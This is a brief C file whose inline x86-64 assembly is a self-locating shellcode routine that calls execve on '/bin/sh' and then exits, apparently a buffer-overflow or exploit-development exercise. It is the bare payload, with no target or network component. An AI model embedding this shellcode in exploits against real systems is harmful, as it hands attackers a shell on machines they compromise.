#include <stdio.h>

void main()
{
__asm__ (
		"jmp .+0x35;"
		"pop %rbx;"
		"mov %rbx, 0x8(%rbx);"
		"movb $0x0, 0x7(%rbx);"
		"movq $0x0, 0x10(%rbx);"
		"mov $0x3b, %eax;"
		"mov $0x0, %edx;"
		"mov 0x8(%rbx), %rdi;"
		"lea 0x8(%rbx), %rsi;"
		"syscall;"
		"mov $0x0, %rdi;"
		"mov $0x3c, %eax;"
		"syscall;"
		"call .-0x33;"
		".string \"/bin/sh                 \";"
);
}
